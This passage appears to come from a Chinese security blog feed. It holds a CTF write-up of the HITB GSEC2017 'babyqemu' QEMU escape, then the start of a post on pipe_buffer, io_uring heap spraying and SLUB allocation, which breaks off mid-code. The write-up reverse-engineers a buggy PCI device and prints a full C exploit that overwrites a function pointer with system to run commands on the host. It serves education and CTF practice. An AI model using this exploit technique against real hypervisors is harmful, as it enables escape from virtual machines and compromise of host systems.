perror(&quot;mmap mmio&quot;);        exit(-1);    &#125;    printf(&quot;mmio_mem:\\t%p\\n&quot;, mmio_mem);    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);    if (userbuf == MAP_FAILED)&#123;        perror(&quot;mmap userbuf&quot;);        exit(-1);    &#125;    strcpy(usebuf,&quot;test&quot;);    mlock(userbuf, 0x1000);    userbuf_pa = va2pa(userbuf);    printf(&quot;userbuf_va:\\t%p\\n&quot;,userbuf);    printf(&quot;userbuf_pa:\\t%p\\n&quot;,(void *)userbuf_pa);&#125;\n\nPCI设备符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。PCI 设备同时也分为主设备和目标设备两种，主设备是一次访问操作的发起者，而目标设备则是被访问者。\nmmio而在设备中存在不同的地址映射模式。而mmio则是内存映射io，和内存共享一个地址空间。可以和像读写内存一样读写其内容。\n\n\n  Bit 0：Region Type，总是为 0，用于区分此类型为 Memory\n  Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB\n  Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取\n  Bits 31-4：Base Address，以 16 字节对齐基址\n\n\n在用户态下访问mmio空间代码示例：\n#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include&lt;sys/io.h&gt;unsigned char* mmio_mem;void die(const char* msg)&#123;    perror(msg);    exit(-1);&#125;void mmio_write(uint32_t addr, uint32_t value)&#123;    *((uint32_t*)(mmio_mem + addr)) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123;    return *((uint32_t*)(mmio_mem + addr));&#125;int main(int argc, char *argv[])&#123;    // Open and map I/O memory for the strng device    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)        die(&quot;mmio_fd open failed&quot;);    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)        die(&quot;mmap mmio_mem failed&quot;);    printf(&quot;mmio_mem @ %p\\n&quot;, mmio_mem);    mmio_read(0x128);    mmio_write(0x128, 1337);&#125;\n\n在内核态下访问mmio空间代码示例：\n#include &lt;asm/io.h&gt;#include &lt;linux/ioport.h&gt;long addr=ioremap(ioaddr,iomemsize);readb(addr);readw(addr);readl(addr);readq(addr);//qwords=8 btyeswriteb(val,addr);writew(val,addr);writel(val,addr);writeq(val,addr);iounmap(addr);\n\npmio端口映射io，内存和io设备有个字独立的地址空间，cpu需要通过专门的指令才能去访问。在intel的微处理器中使用的指令是IN和OUT。\n\n\n  Bit 0：Region Type，总是为 1，用于区分此类型为 I/O\n  Bit 1：Reserved\n  Bits 31-2：Base Address，以 4 字节对齐基址\n\n\n访问pmio代码示例：\n#include &lt;sys/io.h&gt;uint32_t pmio_base = 0xc050;uint32_t pmio_write(uint32_t addr, uint32_t value)&#123;    outl(value,addr);&#125;uint32_t pmio_read(uint32_t addr)&#123;    return (uint32_t)inl(addr);&#125;int main(int argc, char *argv[])&#123;    // Open and map I/O memory for the strng device    if (iopl(3) !=0 )        die(&quot;I/O permission is not enough&quot;);        pmio_write(pmio_base+0,0);    pmio_write(pmio_base+4,1);&#125;\n\nlspcipci外设地址，形如0000:00:1f.1。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分表示3位表示功能号。下面是lspci的输出，其中pci设备的地址，在最头部给出，由于pc设备总只有一个0号域，随意会省略域。\n\n在/sys/bus/pci/devices可以找到每个总线设备相关的一写文件。\n\n\n每个设备的目录下resource0 对应MMIO空间。resource1 对应PMIO空间。resource文件里面会记录相关的数据，第一行就是mimo的信息，从左到右是：起始地址、结束地址、标识位。\nHITB GSEC2017 babyqemu因为是第一次玩qemu逃逸，所以题目记录的比较详细，偏向新手向！\n分析程序首先注意的是加载文件\n./qemu-system-x86_64 \\-initrd ./rootfs.cpio \\-kernel ./vmlinuz-4.8.0-52-generic \\-append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \\-enable-kvm \\-monitor /dev/null \\-m 64M --nographic  -L ./dependency/usr/local/share/qemu \\-L pc-bios \\-device hitb,id=vda\n\n这里需要注意的是 -device 选项，可以看到这里的设备为 hitb 这个pci设备。\n那么逆向的方法就是将qemu-system-x86_64拖入ida搜索hitb\n\n首先则是先观察init函数\nvoid __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)&#123;  ObjectClass_0 *v2; // rax  v2 = object_class_dynamic_cast_assert(         a1,         (const char *)&amp;stru_64A230.bulk_in_pending[2].data[72],         (const char *)&amp;stru_5AB2C8.msi_vectors,         469,         &quot;hitb_class_init&quot;);  BYTE4(v2[2].object_cast_cache[3]) = 16;  HIWORD(v2[2].object_cast_cache[3]) = 255;  v2[2].type = (Type)pci_hitb_realize;  v2[2].object_cast_cache[0] = (const char *)pci_hitb_uninit;  LOWORD(v2[2].object_cast_cache[3]) = 4660;  WORD1(v2[2].object_cast_cache[3]) = 9011;&#125;\n\n在init初始化函数，需要将设备类型定义为PCIDeviceClass结构体。PCIDeviceClass结构体在Local type中可以找到它的描述定义。\nstruct PCIDeviceClass&#123;  DeviceClass_0 parent_class;  void (*realize)(PCIDevice_0 *, Error_0 **);    //0xc0  int (*init)(PCIDevice_0 *);  PCIUnregisterFunc *exit;  PCIConfigReadFunc *config_read;  PCIConfigWriteFunc *config_write;  uint16_t vendor_id;    //0xe8  uint16_t device_id;    //0xea  uint8_t revision;  uint16_t class_id;  uint16_t subsystem_vendor_id;  uint16_t subsystem_id;  int is_bridge;  int is_express;  const char *romfile;&#125;;\n\n这里手动添加一下结构体再修改init函数中的变量定义\n00000000 PCIDeviceClass struc ; (sizeof=0x108, align=0x8, copyof_1371)00000000 parent_class DeviceClass_0 ?000000C0 realize dq ?                            ; offset000000C8 init dq ?                               ; offset000000D0 exit dq ?                               ; offset000000D8 config_read dq ?                        ; offset000000E0 config_write dq ?                       ; offset000000E8 vendor_id dw ?000000EA device_id dw ?000000EC revision db ?000000ED db ? ; undefined000000EE class_id dw ?000000F0 subsystem_vendor_id dw ?000000F2 subsystem_id dw ?000000F4 is_bridge dd ?000000F8 is_express dd ?000000FC db ? ; undefined000000FD db ? ; undefined000000FE db ? ; undefined000000FF db ? ; undefined00000100 romfile dq ?                            ; offset00000108 PCIDeviceClass ends00000108\n\nvoid __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)&#123;  PCIDeviceClass *v2; // rax  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(                           a1,                           (const char *)&amp;stru_64A230.bulk_in_pending[2].data[72],                           (const char *)&amp;stru_5AB2C8.msi_vectors,                           469,                           &quot;hitb_class_init&quot;);  v2-&gt;revision = 16;  v2-&gt;class_id = 255;  v2-&gt;realize = pci_hitb_realize;  v2-&gt;exit = pci_hitb_uninit;  v2-&gt;vendor_id = 4660;  v2-&gt;device_id = 0x2333;&#125;\n\n可以看到设备号device_id=0x2333，功能号vendor_id=0x1234\n# lspci -v00:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:701000:02.0 Class 0300: 1234:111100:01.0 Class 0601: 8086:700000:04.0 Class 00ff: 1234:2333# ls /sys/bus/pci/devices/0000\\:00\\:04.0/broken_parity_status      firmware_node             rescanclass                     irq                       resourceconfig                    local_cpulist             resource0consistent_dma_mask_bits  local_cpus                subsystemd3cold_allowed            modalias                  subsystem_devicedevice                    msi_bus                   subsystem_vendordma_mask_bits             numa_node                 ueventdriver_override           power                     vendorenable                    remove# cat /sys/bus/pci/devices/0000\\:00\\:04.0/resource0x00000000fea00000 0x00000000feafffff 0x00000000000402000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000\n\nresource文件内容的格式为start end flag 。在resource0文件中，根据这里没有resource1文件或者根据flag最后一位为0可知存在一个MMIO的内存空间，地址为0xfea00000，大小为0x100000。\n其次分析注册的函数，通过pci_hitb_realize函数查看\nvoid __fastcall pci_hitb_realize(HitbState *pdev, Error_0 **errp)&#123;  pdev-&gt;pdev.config[61] = 1;  if ( !msi_init(&amp;pdev-&gt;pdev, 0, 1u, 1, 0, errp) )  &#123;    timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[1], 1000000, (QEMUTimerCB *)hitb_dma_timer, pdev);    qemu_mutex_init(&amp;pdev-&gt;thr_mutex);    qemu_cond_init(&amp;pdev-&gt;thr_cond);    qemu_thread_create(&amp;pdev-&gt;thread, (const char *)&amp;stru_5AB2C8.not_legacy_32bit + 12, hitb_fact_thread, pdev, 0);    memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, &quot;hitb-mmio&quot;, 0x100000uLL);    pci_register_bar(&amp;pdev-&gt;pdev, 0, 0, &amp;pdev-&gt;mmio);  &#125;&#125;\n\n首先可以看到在timer_init_tl函数是将hitb_dma_timer作为回调函数\nvoid __fastcall timer_init_tl(QEMUTimer_0 *ts, QEMUTimerList_0 *timer_list, int scale, QEMUTimerCB *cb, void *opaque)&#123;  ts-&gt;timer_list = timer_list;  ts-&gt;cb = cb;  ts-&gt;opaque = opaque;  ts-&gt;scale = scale;  ts-&gt;expire_time = -1LL;&#125;\n\n接着在下面注册了hitb_mmio_ops\n.data.rel.ro:00000000009690A0 40 44 28 00 00 00 00 00 A0 41+hitb_mmio_ops dq offset hitb_mmio_read                ; read.data.rel.ro:00000000009690A0 28 00 00 00 00 00 00 00 00 00+                                        ; DATA XREF: pci_hitb_realize+99↑o.data.rel.ro:00000000009690A0 00 00 00 00 00 00 00 00 00 00+dq offset hitb_mmio_write               ; write.data.rel.ro:00000000009690A0 00 00 00 00 00 00 00 00 00 00+dq 0\n\n所以这里需要重点注意的也就是这样三个函数：\nhitb_mmio_readhitb_mmio_writehitb_dma_timer\n\n分析函数在分析函数之前还需要搞懂设备结构体，具体可以在view-&gt;Open Subviews-&gt;Local Type(shift + F1)中搜索\nstruct __attribute__((aligned(16))) HitbState&#123;  PCIDevice_0 pdev;  MemoryRegion_0 mmio;  QemuThread_0 thread;  QemuMutex_0 thr_mutex;  QemuCond_0 thr_cond;  bool stopping;  uint32_t addr4;  uint32_t fact;  uint32_t status;  uint32_t irq_status;  dma_state dma;  QEMUTimer_0 dma_timer;  char dma_buf[4096];  void (*enc)(char *, unsigned int);  uint64_t dma_mask;&#125;;\n\nstruct dma_state&#123;  dma_addr_t src;  dma_addr_t dst;  dma_addr_t cnt;  dma_addr_t cmd;&#125;;\n\nuint64_t __fastcall hitb_mmio_read(HitbState *opaque, hwaddr addr, unsigned int size)&#123;  uint64_t result; // rax  uint64_t val; // [rsp+0h] [rbp-20h]  result = -1LL;  if ( size == 4 )  &#123;    if ( addr == 128 )      return opaque-&gt;dma.src;    if ( addr &gt; 0x80 )    &#123;      if ( addr == 140 )        return *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.dst + 4);      if ( addr &lt;= 0x8C )      &#123;        if ( addr == 132 )          return *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.src + 4);        if ( addr == 136 )          return opaque-&gt;dma.dst;      &#125;      else      &#123;        if ( addr == 144 )          return opaque-&gt;dma.cnt;        if ( addr == 152 )          return opaque-&gt;dma.cmd;      &#125;    &#125;    else    &#123;      if ( addr == 8 )      &#123;        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);        val = opaque-&gt;fact;        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);        return val;      &#125;      if ( addr &lt;= 8 )      &#123;        result = 0x10000EDLL;        if ( !addr )          return result;        if ( addr == 4 )          return opaque-&gt;addr4;      &#125;      else      &#123;        if ( addr == 32 )          return opaque-&gt;status;        if ( addr == 36 )          return opaque-&gt;irq_status;      &#125;    &#125;    return -1LL;  &#125;  return result;&#125;\n\n需要满足size == 4才能读取\nvoid __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  uint32_t v4; // r13d  int v5; // edx  bool v6; // zf  int64_t ns; // rax  if ( (addr &gt; 0x7F || size == 4) &amp;&amp; (((size - 4) &amp; 0xFFFFFFFB) == 0 || addr &lt;= 0x7F) )  &#123;    if ( addr == 128 )    &#123;      if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )        opaque-&gt;dma.src = val;    &#125;    else    &#123;      v4 = val;      if ( addr &gt; 0x80 )      &#123;        if ( addr == 140 )        &#123;          if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )            *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.dst + 4) = val;        &#125;        else if ( addr &gt; 0x8C )        &#123;          if ( addr == 144 )          &#123;            if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )              opaque-&gt;dma.cnt = val;          &#125;          else if ( addr == 152 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )          &#123;            opaque-&gt;dma.cmd = val;            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);            timer_mod(&amp;opaque-&gt;dma_timer, ns / 1000000 + 100);          &#125;        &#125;        else if ( addr == 132 )        &#123;          if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )            *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.src + 4) = val;        &#125;        else if ( addr == 136 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )        &#123;          opaque-&gt;dma.dst = val;        &#125;      &#125;      else if ( addr == 32 )      &#123;        if ( (val &amp; 0x80) != 0 )          _InterlockedOr((volatile signed __int32 *)&amp;opaque-&gt;status, 0x80u);        else          _InterlockedAnd((volatile signed __int32 *)&amp;opaque-&gt;status, 0xFFFFFF7F);      &#125;      else if ( addr &gt; 0x20 )      &#123;        if ( addr == 96 )        &#123;          v6 = ((unsigned int)val | opaque-&gt;irq_status) == 0;          opaque-&gt;irq_status |= val;          if ( !v6 )            hitb_raise_irq(opaque, 0x60u);        &#125;        else if ( addr == 100 )        &#123;          v5 = ~(_DWORD)val;          v6 = (v5 &amp; opaque-&gt;irq_status) == 0;          opaque-&gt;irq_status &amp;= v5;          if ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )            pci_set_irq(&amp;opaque-&gt;pdev, 0);        &#125;      &#125;      else if ( addr == 4 )      &#123;        opaque-&gt;addr4 = ~(_DWORD)val;      &#125;      else if ( addr == 8 &amp;&amp; (opaque-&gt;status &amp; 1) == 0 )      &#123;        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);        opaque-&gt;fact = v4;        _InterlockedOr((volatile signed __int32 *)&amp;opaque-&gt;status, 1u);        qemu_cond_signal(&amp;opaque-&gt;thr_cond);        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);      &#125;    &#125;  &#125;&#125;\n\n同样需要满足size == 4，并且在部分操作还需要满足(opaque-&gt;dma.cmd &amp; 1) == 0\nvoid __fastcall hitb_dma_timer(HitbState *opaque)&#123;  dma_addr_t cmd; // rax  __int64 v2; // rdx  uint8_t *cnt_low; // rsi  dma_addr_t v4; // rax  dma_addr_t v5; // rdx  uint8_t *v6; // rbp  char *v7; // rbp  cmd = opaque-&gt;dma.cmd;  if ( (cmd &amp; 1) != 0 )  &#123;    if ( (cmd &amp; 2) != 0 )    &#123;      v2 = (unsigned int)(LODWORD(opaque-&gt;dma.src) - 0x40000);      if ( (cmd &amp; 4) != 0 )                     // 7      &#123;        v7 = &amp;opaque-&gt;dma_buf[v2];        opaque-&gt;enc(v7, opaque-&gt;dma.cnt);        cnt_low = (uint8_t *)v7;      &#125;      else                                      // 3      &#123;        cnt_low = (uint8_t *)&amp;opaque-&gt;dma_buf[v2];      &#125;      cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, 1);      v4 = opaque-&gt;dma.cmd;      v5 = v4 &amp; 4;    &#125;    else                                        // 1    &#123;      v6 = (uint8_t *)&amp;opaque[-36] + (unsigned int)opaque-&gt;dma.dst - 2824;      LODWORD(cnt_low) = (_DWORD)opaque + opaque-&gt;dma.dst - 0x40000 + 3000;      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0);      v4 = opaque-&gt;dma.cmd;      v5 = v4 &amp; 4;      if ( (v4 &amp; 4) != 0 )      &#123;        cnt_low = (uint8_t *)LODWORD(opaque-&gt;dma.cnt);        opaque-&gt;enc((char *)v6, (unsigned int)cnt_low);        v4 = opaque-&gt;dma.cmd;        v5 = v4 &amp; 4;      &#125;    &#125;    opaque-&gt;dma.cmd = v4 &amp; 0xFFFFFFFFFFFFFFFELL;    if ( v5 )    &#123;      opaque-&gt;irq_status |= 0x100u;      hitb_raise_irq(opaque, (uint32_t)cnt_low);    &#125;  &#125;&#125;\n\n这里就是回调函数了，在上面的hitb_mmio_write函数中，当满足if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )就会调用了。而在这个函数中存在这样一个函数cpu_physical_memory_rw，这个函数在我翻看手册的时候还发现了其他类似的函数cpu_physical_memory_read、cpu_physical_memory_write所以可以猜测得到这个函数到底是干什么的。这个函数就是用于传递内容在物理地址和虚拟地址之间。cpu_physical_memory_rw函数的第一个参数时物理地址，虚拟地址需要通过读取/proc/$pid/pagemap转换为物理地址。\n\n dma.cmd==7时，idx=dma.src-0x40000，addr = dma_buf[idx]，调用enc加密函数加密，并写入到dma.dst中\n dma.cmd==3时，idx=dma.src-0x40000，addr = dma_buf[idx]，写入到dma.dst中\n dma.cmd==1时，idx=dma.dst-0x40000,addr=dma_buf[idx]，将其写入到dma.src中（第二个参数可以通过调试得到其地址就是dma_buf[dma.dst-0x40000]\n\n这个程序的作用就显而易见，这里实现的是一个dma机制。DMA(Direct Memory Access，直接内存存取) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。DMA 传输将数据从一个地址空间复制到另外一个地址空间。当CPU 初始化这个传输动作，传输动作本身是由 DMA 控制器来实行和完成。\n即首先通过访问mmio地址与值（addr与value），在hitb_mmio_write函数中设置好dma中的相关值（src、dst以及cmd)。当需要dma传输数据时，设置addr为152，就会触发时钟中断，由另一个线程去处理时钟中断。时钟中断调用hitb_dma_timer，该函数根据dma.cmd的不同调用cpu_physical_memory_rw函数将数据从物理地址拷贝到dma_buf中或从dma_buf拷贝到物理地址中。\n漏洞分析与利用接下来就是分析程序的漏洞了，这里的漏洞是非常明显的位于hitb_dma_timer函数中，其中的v2是没有做任何边界检查的，存在明显的溢出漏洞。\n并且在上述找到的结构体看到了，他的dma_buf的大小只有4096，并且下方紧接着就是enc。而我们都知道enc存放的是回调函数，所以这里的利用思路就是，通过溢出泄漏出enc中存放的函数地址，紧接着修改其中的函数为system@plt，最后在dma_buf中写入cat flag\\x00即可获取flag。\nexp\n#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)void die(const char *msg)&#123;    perror(msg);    exit(-1);&#125;size_t va2pa(void *addr)&#123;    uint64_t data;    int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);    if (!fd)    &#123;        perror(&quot;open pagemap&quot;);        return 0;    &#125;    size_t offset = ((uintptr_t)addr / PAGE_SIZE) * sizeof(uint64_t);    if (lseek(fd, offset, SEEK_SET) &lt; 0)    &#123;        puts(&quot;lseek&quot;);        close(fd);        return 0;    &#125;    if (read(fd, &amp;data, 8) != 8)    &#123;        puts(&quot;read&quot;);        close(fd);        return 0;    &#125;    if (!(data &amp; (((uint64_t)1 &lt;&lt; 63))))    &#123;        puts(&quot;page&quot;);        close(fd);        return 0;    &#125;    size_t pageframenum = data &amp; ((1ull &lt;&lt; 55) - 1);    size_t phyaddr = pageframenum * PAGE_SIZE + (uintptr_t)addr % PAGE_SIZE;    close(fd);    return phyaddr;&#125;#define DMABASE 0x40000char *userbuf;uint64_t phy_userbuf;unsigned char *mmio_mem;void mmio_write(uint32_t addr, uint32_t value)&#123;    *((uint32_t *)(mmio_mem + addr)) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123;    return *((uint32_t *)(mmio_mem + addr));&#125;void dma_set_src(uint32_t src_addr)&#123;    mmio_write(0x80, src_addr);&#125;void dma_set_dst(uint32_t dst_addr)&#123;    mmio_write(0x88, dst_addr);&#125;void dma_set_cnt(uint32_t cnt)&#123;    mmio_write(0x90, cnt);&#125;void dma_do_cmd(uint32_t cmd)&#123;    mmio_write(0x98, cmd);&#125;void dma_do_write(uint32_t addr, void *buf, size_t len)&#123;    memcpy(userbuf, buf, len);    dma_set_src(phy_userbuf);    dma_set_dst(addr);    dma_set_cnt(len);    dma_do_cmd(0 | 1);    sleep(1);&#125;void dma_do_read(uint32_t addr, size_t len)&#123;    dma_set_dst(phy_userbuf);    dma_set_src(addr);    dma_set_cnt(len);    dma_do_cmd(2 | 1);    sleep(1);&#125;void dma_do_enc(uint32_t addr, size_t len)&#123;    dma_set_src(addr);    dma_set_cnt(len);    dma_do_cmd(1 | 4 | 2);&#125;int main()&#123;    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)        die(&quot;mmio_fd open failed&quot;);    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)        die(&quot;mmap mmio_mem failed&quot;);    printf(&quot;mmio_mem @ %p\\n&quot;, mmio_mem);    // Allocate DMA buffer and obtain its physical address    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);    if (userbuf == MAP_FAILED)        die(&quot;mmap&quot;);    mlock(userbuf, 0x1000);    phy_userbuf = va2pa(userbuf);    printf(&quot;user buff virtual address: %p\\n&quot;, userbuf);    printf(&quot;user buff physical address: %p\\n&quot;, (void *)phy_userbuf);    // out of bound to leak enc ptr    dma_do_read(0x1000 + DMABASE, 8);    uint64_t leak_enc = *(uint64_t *)userbuf;    printf(&quot;leaking enc function: %p\\n&quot;, (void *)leak_enc);    uint64_t pro_base = leak_enc - 0x283DD0;    uint64_t system_plt = pro_base + 0x1FDB18;    // out of bound to overwrite enc ptr to system ptr    dma_do_write(0x1000 + DMABASE, &amp;system_plt, 8);    // deply the parameter of system function    char *command = &quot;cat flag\\x00&quot;;    dma_do_write(0x200 + DMABASE, command, strlen(command));    // trigger the enc ptr to execute system    dma_do_enc(0x200 + DMABASE, 8);    return 0;&#125;\n\n\n调试脚本：\n#!/bin/bashpid=`ps -aux | grep &quot;qemu-system-x86_64&quot; | grep -v &quot;grep&quot; | awk &#x27;&#123;print($2)&#125;&#x27;`sudo gdb \\-ex &quot;file qemu-system-x86_64&quot; \\-ex &quot;attach $pid&quot; \\-ex &quot;b*\\$rebase(0x284191)&quot;\n\n\n\n题目地址：https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz\n参考链接：\nhttps://www.anquanke.com/post/id/224199#h3-5\nhttps://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup\nhttps://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio\n","categories":["qemu escape"],"tags":["qemu escape"]},{"title":"向pipe_buffer说yes！","url":"/2023/05/24/pipe-buffer/","content":"\n前言起因是墨晚鸢大佬的一句回复，不过我这里还没尝试挖掘新的东西，更多的是对墨晚鸢佬的内容做适合自己理解的总结。可以看到标签中还有一个上一篇文章主要介绍的io_uring，这里就先说说。\n万字警告！！！\nio_uring在堆喷中的局限性int __io_account_mem(struct user_struct *user, unsigned long nr_pages)&#123;\tunsigned long page_limit, cur_pages, new_pages;\tif (!nr_pages)\t\treturn 0;\t/* Don&#x27;t allow more pages than we can safely lock */\tpage_limit = rlimit(RLIMIT_MEMLOCK) &gt;&gt; PAGE_SHIFT;\tcur_pages = atomic_long_read(&amp;user-&gt;locked_vm);\tdo &#123;\t\tnew_pages = cur_pages + nr_pages;\t\tif (new_pages &gt; page_limit)\t\t\treturn -ENOMEM;\t&#125; while (!atomic_long_try_cmpxchg(&amp;user-&gt;locked_vm,\t\t\t\t\t  &amp;cur_pages, new_pages));\treturn 0;&#125;\n\n在我进行一次堆喷过后，并使用update去修改内容是会返回错误-12，则是在上面的函数中，new_page超过了可以安全lock的page数量，也就是new_pages &gt; page_limit导致的。\n而上面这个函数最初是由io_sqe_buffer_register函数调用的，所以不幸的是在对io_uring进行分配的时候就要开始考虑了。所以在我们平时动不动就要面对4096次之类的大范围堆喷时io_uring就显得有点儿力不从心了。\n不过除了以上这样一点缺点io_uring的表现依旧是令人满意的。\nslab分配源码分析众所周知，分配slab的机制为buddy system机制进行的。而进行分配的最终函数为alloc_slab_page函数进行分配，并且大家都知道buddy system分配时大小为PAGE_SIZE * pow(2,order)，所以order的由来就显得尤为重要了。\nstatic inline unsigned int oo_order(struct kmem_cache_order_objects x)&#123;\treturn x.x &gt;&gt; OO_SHIFT;&#125;static inline struct slab *alloc_slab_page(gfp_t flags, int node,\t\tstruct kmem_cache_order_objects oo)&#123;\tstruct folio *folio;\tstruct slab *slab;\tunsigned int order = oo_order(oo);\tif (node == NUMA_NO_NODE)\t\tfolio = (struct folio *)alloc_pages(flags, order);\telse\t\tfolio = (struct folio *)__alloc_pages_node(node, flags, order);\tif (!folio)\t\treturn NULL;\tslab = folio_slab(folio);\t__folio_set_slab(folio);\t/* Make the flag visible before any changes to folio-&gt;mapping */\tsmp_wmb();\tif (page_is_pfmemalloc(folio_page(folio, 0)))\t\tslab_set_pfmemalloc(slab);\treturn slab;&#125;\n\n可以看到在alloc_slab_page函数中使用order是在oo中，而这个oo这时kmem_cache结构体中的成员。\nkmem_cache_create_usercopy流程kmem_cache_create_usercopy用来注册一个cache，所以他也会分配一个slab供他自己使用，不过分配的时间点是在这个cache中第一次申请object的时候触发的。而kmem_cache_create_usercopy函数主要是对slab的初始化，其中就包括了我们比较关注的order了。\n因为前半部分的函数都没有直接和order产生关系，所以这里就给一下大家调用连不贴源码占篇幅了。\nkmem_cache_create_usercopy=&gt;create_cache=&gt;__kmem_cache_create=&gt;kmem_cache_open=&gt;calculate_sizes\ncalculate_sizes函数static int calculate_sizes(struct kmem_cache *s)&#123;\tslab_flags_t flags = s-&gt;flags;\tunsigned int size = s-&gt;object_size;\tunsigned int order;\t... ...\torder = calculate_order(size);\tif ((int)order &lt; 0)\t\treturn 0;\ts-&gt;allocflags = 0;\tif (order)\t\ts-&gt;allocflags |= __GFP_COMP;\tif (s-&gt;flags &amp; SLAB_CACHE_DMA)\t\ts-&gt;allocflags |= GFP_DMA;\tif (s-&gt;flags &amp; SLAB_CACHE_DMA32)\t\ts-&gt;allocflags |= GFP_DMA32;\tif (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)\t\ts-&gt;allocflags |= __GFP_RECLAIMABLE;\t/*\t * Determine the number of objects per slab\t */\ts-&gt;oo = oo_make(order, size);\ts-&gt;min = oo_make(get_order(size), size);\treturn !!oo_objects(s-&gt;oo);&#125;\n\n可以看到在函数最后这部分就是对oo的赋值，所以理所应当去calculate_order理清逻辑。\ncalculate_order函数static inline int calculate_order(unsigned int size)&#123;\tunsigned int order;\tunsigned int min_objects;\tunsigned int max_objects;\tunsigned int nr_cpus;\t/*\t * Attempt to find best configuration for a slab. This\t * works by first attempting to generate a layout with\t * the best configuration and backing off gradually.\t *\t * First we increase the acceptable waste in a slab. Then\t * we reduce the minimum objects required in a slab.\t */\tmin_objects = slub_min_objects;\tif (!min_objects) &#123;\t\t/*\t\t * Some architectures will only update present cpus when\t\t * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But\t\t * we also don&#x27;t want to use nr_cpu_ids always, as on some other\t\t * architectures, there can be many possible cpus, but never\t\t * onlined. Here we compromise between trying to avoid too high\t\t * order on systems that appear larger than they are, and too\t\t * low order on systems that appear smaller than they are.\t\t */\t\tnr_cpus = num_present_cpus();\t\tif (nr_cpus &lt;= 1)\t\t\tnr_cpus = nr_cpu_ids;\t\tmin_objects = 4 * (fls(nr_cpus) + 1);\t&#125;\tmax_objects = order_objects(slub_max_order, size);\tmin_objects = min(min_objects, max_objects);\twhile (min_objects &gt; 1) &#123;\t\tunsigned int fraction;\t\tfraction = 16;\t\twhile (fraction &gt;= 4) &#123;\t\t\torder = calc_slab_order(size, 